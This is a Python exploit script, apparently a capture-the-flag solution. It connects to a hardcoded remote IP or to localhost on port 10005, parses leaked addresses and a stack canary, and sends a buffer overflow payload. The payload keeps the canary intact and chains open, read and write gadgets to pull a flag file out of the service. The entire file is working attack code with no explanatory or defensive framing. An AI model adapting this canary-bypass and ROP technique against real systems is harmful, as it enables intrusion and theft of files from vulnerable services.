import socket
import struct
import sys

global target_addr
global target_port

def main():
        if sys.argv[1] == '-r':
		target_addr = "133.130.115.234"
        else:
                target_addr = "localhost"

        target_port = 10005

	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((target_addr,target_port))
        

	str = s.recv(21)
        flagpath_addr = int(str[10:20],16)
        print "[+]flagpath_addr = %08x" % flagpath_addr

        str = s.recv(20)
        flagbuf_addr = int(str[9:19],16)
        print "[+]flagbuf_addr = %08x" % flagbuf_addr

	str = s.recv(20)
        canary = int(str[9:19],16)
	print "[+]canary value = %08x" % canary

        open_gadget = 0x080486fb
        read_gadget = 0x08048701
        write_gadget = 0x08048709

        buf = 'A' * 20
	buf += struct.pack('<I',canary)
        buf += 'AAAA' * 3

	buf += struct.pack('<I',open_gadget)
        buf += struct.pack('<I',0x5)
        buf += struct.pack('<I',flagpath_addr)
        buf += struct.pack('<I',0x0)

        buf += struct.pack('<I',read_gadget)
	buf += struct.pack('<I',0x3)
	buf += struct.pack('<I',0x32)
        buf += struct.pack('<I',flagbuf_addr)

        buf += struct.pack('<I',write_gadget)
        buf += struct.pack('<I',0x1)
        buf += struct.pack('<I',0x4)

	buf += "\n"

	s.send(buf);
	str = s.recv(1024)
	print(str)
        str = s.recv(1024)
        print(str)
        str = s.recv(1024)
        print(str)

if __name__ == '__main__':
	main()
